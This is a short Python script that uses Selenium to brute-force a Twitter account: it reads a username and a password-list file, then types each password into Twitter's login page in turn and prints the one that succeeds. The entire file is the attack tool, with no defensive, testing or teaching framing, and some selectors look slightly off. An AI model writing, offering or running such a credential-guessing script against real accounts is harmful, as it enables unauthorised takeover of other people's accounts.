#PYTHON3
from selenium import webdriver
from getpass import getpass
import time
usr = input('Enter your username or email : ')
fileName = input('Enter the file name : ')
file = open(fileName,'r')
for pwd in file:
    driver = webdriver.Chrome('/usr/bin/chromedriver')
    driver.get('https://twitter.com/login')

    usr_box = driver.find_element_by_class_name('js-username-field')
    usr_box.send_keys(usr)

    pwd_box = driver.find_element_by_class_name('js-password-field')
    pwd_box.send_keys(pwd)

    login_button = driver.find_element_by_css_selector('button.submit.EdgeButton.EdgeButton--primary.EdgeButtom--medium')
    login_button.submit()
    tUrl = 'https://twitter.com/'
    cUrl = driver.current_url
    if cUrl != tUrl:
        driver.close()
        print('Wrong pass')
        #time.sleep(20)
    else:
        print(pwd)
        break
